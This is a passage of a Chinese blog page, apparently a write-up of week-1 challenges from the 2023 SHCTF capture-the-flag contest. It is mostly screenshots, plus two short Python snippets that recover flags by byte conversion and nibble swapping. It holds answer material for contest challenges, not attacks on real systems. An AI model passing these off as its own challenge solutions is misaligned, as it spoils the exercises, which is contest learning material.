+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps6.jpg, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps6.jpg 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps6.jpg 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps7.jpg" title="img" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps7.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps7.jpg"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps7.jpg, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps7.jpg 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps7.jpg 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<h3 id="week1what-is-m" class="headerLink">
+    <a href="#week1what-is-m" class="header-mark"></a>[WEEK1]what is m</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">from Crypto.Util.number import bytes_to_long
+</span></span><span class="line"><span class="cl">from Crypto.Util.number import inverse,long_to_bytes
+</span></span><span class="line"><span class="cl">m = 7130439814057451252206961031070073581161360005074250134175813545291250484317873215316850120633657018292427636656594416171229024284761739178169667824242590880304270396813980988571810173170813
+</span></span><span class="line"><span class="cl">flag=long_to_bytes(m)
+</span></span><span class="line"><span class="cl">flag.decode()
+</span></span><span class="line"><span class="cl">print(flag)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="week1立正" class="headerLink">
+    <a href="#week1%e7%ab%8b%e6%ad%a3" class="header-mark"></a>[WEEK1]立正</h3><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps44.jpg" title="img" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps44.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps44.jpg"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps44.jpg, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps44.jpg 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps44.jpg 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>但，，，最后没解出来</p>
+<h2 id="reverse" class="headerLink">
+    <a href="#reverse" class="header-mark"></a>REVERSE</h2><h3 id="week1ez_apk" class="headerLink">
+    <a href="#week1ez_apk" class="header-mark"></a>[WEEK1]ez_apk</h3><p>Jeb，base62换表</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps57.jpg" title="img" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps57.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps57.jpg"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps57.jpg, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps57.jpg 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps57.jpg 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<h3 id="week1signin" class="headerLink">
+    <a href="#week1signin" class="header-mark"></a>[WEEK1]signin</h3><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps23.jpg" title="img" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps23.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps23.jpg"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps23.jpg, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps23.jpg 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps23.jpg 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<h3 id="week1easy_re" class="headerLink">
+    <a href="#week1easy_re" class="header-mark"></a>[WEEK1]easy_re</h3><p>Ida F5得到加密代码</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps39.jpg" title="img" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps39.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps39.jpg"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps39.jpg, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps39.jpg 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps39.jpg 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>跟进比对字符串</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps40.jpg" title="img" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps40.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps40.jpg"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps40.jpg, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps40.jpg 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps40.jpg 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">code = [0x66,0x0C6,0x16,0x76,0x0B7,0x45,0x27,0x97,0x0F5,0x47,0x3,0x0F5,0x37,0x3,0x0C6,0x67,0x33,0x0F5,0x47,0x86,0x56,0x0F5,0x26,0x96,0x0E6,0x16,0x27,0x97,0x0F5,0x7,0x27,0x3,0x26,0x0C6,0x33,0x0D6,0x0D7,0x1B]
+</span></span><span class="line"><span class="cl">flag=&#34;&#34;
+</span></span><span class="line"><span class="cl">for i in code:
+</span></span><span class="line"><span class="cl">  decrypt = ((i&lt;&lt;4)&amp;0xFF)|(i&gt;&gt;4)
+</span></span><span class="line"><span class="cl">  flag += chr(decrypt)
+</span></span><span class="line"><span class="cl">print(flag)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="pwn" class="headerLink">
+    <a href="#pwn" class="header-mark"></a>PWN</h2><h3 id="week1hard-nc" class="headerLink">
+    <a href="#week1hard-nc" class="header-mark"></a>[WEEK1]hard nc</h3><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps19.jpg" title="img" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps19.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps19.jpg"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps19.jpg, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps19.jpg 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps19.jpg 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps20.jpg" title="img" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps20.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps20.jpg"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps20.jpg, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps20.jpg 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps20.jpg 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<h3 id="week1nc" class="headerLink">
+    <a href="#week1nc" class="header-mark"></a>[WEEK1]nc</h3><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps21.jpg" title="img" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps21.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps21.jpg"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps21.jpg, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps21.jpg 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/wps21.jpg 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p></div>
+
+        <div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2023-11-25</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span><a class="link-to-mardown" href=/2023shctf/index.md target="_blank" rel="noopener noreferrer">Read markdown</a>
+                    </span><span>|&nbsp;<a class="link-to-source" href=https://github.com/HEIGE-PCloud/DoIt/blob/main/exampleSite/content/posts\2023SHCTF.md target="_blank" rel="noopener noreferrer">View source</a>
+                    </span><span>|&nbsp;<a class="link-to-edit" href=https://github.com/HEIGE-PCloud/DoIt/edit/main/exampleSite/content/posts\2023SHCTF.md target="_blank" rel="noopener noreferrer">Edit this page</a>
+                    </span><span>|&nbsp;<a class="link-to-report" href=https://github.com/HEIGE-PCloud/DoIt/issues/new?title=[bug]%202023SHCTF%E8%81%94%E8%B5%9B&body=|Field|Value|%0A|-|-|%0A|Title|2023SHCTF%E8%81%94%E8%B5%9B|%0A|Url|http://scofield1920.github.io/2023shctf/|%0A|Filename|https://github.com/HEIGE-PCloud/DoIt/blob/main/exampleSite/content/posts\2023SHCTF.md| target="_blank" rel="noopener noreferrer">Report issue</a>
+                    </span></div>
+            <div class="post-info-share"><button title="Share on Twitter" data-sharer="twitter" data-url="http://scofield1920.github.io/2023shctf/" data-title="2023SHCTF联赛" data-hashtags="wp"><span class="fab fa-twitter fa-fw"></span></button><button title="Share on Facebook" data-sharer="facebook" data-url="http://scofield1920.github.io/2023shctf/" data-hashtag="wp"><span class="fab fa-facebook-square fa-fw"></span></button><button title="Share on Hacker News" data-sharer="hackernews" data-url="http://scofield1920.github.io/2023shctf/" data-title="2023SHCTF联赛"><span class="fab fa-hacker-news fa-fw"></span></button><button title="Share on Line" data-sharer="line" data-url="http://scofield1920.github.io/2023shctf/" data-title="2023SHCTF联赛"><span data-svg-src="/lib/simple-icons/icons/line.min.svg"></span></button><button title="Share on 微博" data-sharer="weibo" data-url="http://scofield1920.github.io/2023shctf/" data-title="2023SHCTF联赛"><span class="fab fa-weibo fa-fw"></span></button><button title="Share on Telegram" data-sharer="telegram" data-url="http://scofield1920.github.io/2023shctf/" data-title="2023SHCTF联赛" data-web><span class="fab fa-telegram-plane fa-fw"></span></button><script>
+        function shareOnMastodon(title, link) {
+            const SHARE_MASTODON_DOMAIN = "share_mastodon_domain"
+            const savedDomain = localStorage.getItem(SHARE_MASTODON_DOMAIN) ?? "mastodon.social";
+            const domain = prompt("Enter your Mastodon domain", savedDomain);
+            if (domain === null) {
+                return;
+            }
+            localStorage.setItem(SHARE_MASTODON_DOMAIN, domain)
+            const text = title + "\n\n" + link;
+            const url = new URL("https://" + domain)
+            url.pathname = "share"
+            url.searchParams.append('text', text)
+            window.open(url, '_blank', "width=500,height=500,left=500,toolbar=0,status=0");
+        }
+    </script>
+    <button title="Share on Mastodon"onclick="javascript:shareOnMastodon(&#34;2023SHCTF联赛&#34;, &#34;http://scofield1920.github.io/2023shctf/&#34;)"><span class="fab fa-mastodon fa-fw"></span></button></div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/wp/">Wp</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/git/" class="prev" rel="prev" title="Git"><i class="fas fa-angle-left fa-fw"></i>Git</a>
+            <a href="/mailx/" class="next" rel="next" title="mailx通过外部SMTP发邮件">mailx通过外部SMTP发邮件<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+<div id="comments"><div id="utterances"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://utteranc.es/">Utterances</a>.
+            </noscript></div></article></div>
+        </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">
+                    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreferrer" title="Hugo 0.124.1">Hugo</a>&nbsp;|&nbsp;Theme - <a href="https://github.com/HEIGE-PCloud/DoIt" target="_blank" rel="noopener noreferrer" title="DoIt 0.4.0"><i class="far fa-edit fa-fw"></i> DoIt</a>
+                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2023 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank" rel="noopener noreferrer"></a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+            <div class="footer-line"></div>
+            <div class="footer-line">
+            </div>
+        </div></footer></div>
+
+    <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="Back to Top">
+            <i class="fas fa-arrow-up fa-fw"></i>
+        </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+            <i class="fas fa-comment fa-fw"></i>
+        </a>
+    </div><div class="assets"><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":10},"comment":{"utterances":{"darkTheme":"github-dark","issueTerm":"pathname","label":"","lightTheme":"github-light","repo":"Hugo-DoIt/utterances-comments"}},"data":{"desktop-header-typeit":"Sc0fie1d-Blog","mobile-header-typeit":"Sc0fie1d-Blog"},"search":{"algoliaAppID":"5YGRNRQK1G","algoliaIndex":"en_index","algoliaSearchKey":"0ff6874805de24b84aa1d5ebccad56cd","highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":300,"type":"algolia"},"sharerjs":true,"table":{"sort":true},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"desktop-header-typeit":["desktop-header-typeit"],"mobile-header-typeit":["mobile-header-typeit"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/lib/tablesort/tablesort.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/typeit/typeit.min.js"></script><script type="text/javascript" src="/js/theme.min.js" defer></script><script type="text/javascript" src="/js/utterances.min.js" defer></script></div>
+</body>
+
+</html>
